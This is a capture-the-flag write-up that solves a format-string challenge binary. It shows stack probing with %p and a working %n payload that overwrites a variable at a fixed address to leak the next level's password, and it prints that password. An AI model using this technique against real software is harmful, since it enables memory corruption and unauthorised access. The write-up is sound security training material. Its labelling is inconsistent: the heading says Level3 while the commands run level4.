# Level3

> For introductory information on this operating system and binary securities, check [here](./Ressources/README.md).

Let's see what does the binary do.

```shell
  $> ./level4
  teststring
  teststring
```

> It looks like this is similar to the previous level...

Using [`gdb`](https://linux.die.net/man/1/gdb), we can dig through the binary to understand what's going on (full analysis [here](./Ressources/gdb.md)). At first glance it appears that a **buffer overflow** won't be possible here since the program uses [`fgets()`](https://linux.die.net/man/3/fgets) and reads up to **512** bytes while the buffer is **520** bytes long.

There is a built-in way to output the next password if a variable we have no apparent control on is equal to **16930116**. We could update its value via the same attack as previous level using **format string**. This time, the variable is located at `0x08049810`.

Like before let's, first, identify which positional argument is our input.

```shell
  $> python -c 'print "AAAA" + " %p" * 16' | ./level4
AAAA 0xb7ff26b0 0xbffff684 0xb7fd0ff4 (nil) (nil) 0xbffff648 0x804848d 0xbffff440 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x20702520 0x25207025 0x70252070 0x20702520
```

> This time our input is the 12th stack argument because there is more instructions between the variable and the `printf()` call. In this case, another nested function call.

Now that we know the format string position in the stack all we have to do is to create a **16930116** character long string containing the address of the variable involved in the condition to spawn the shell and output this length to its address using `%n`.

```
python -c 'print "\x08\x04\x98\x10"[::-1] + "%16930112c%12$n"' | ./level4    
...
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```

> We, first, write the address of the variable, which is already **4** bytes, so using `%16930112c` will add **16930112** spaces as padding resulting in a **16930116** character long string. Then all we have to do is output the number of character printed until this point using `%n` into the 4th positional argument which is indeed the address of the variable we want to change using `%12$`.

So next user credentials pair is `level5:0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a`.

Check [here](./source.c) for reproduction source-code of this binary.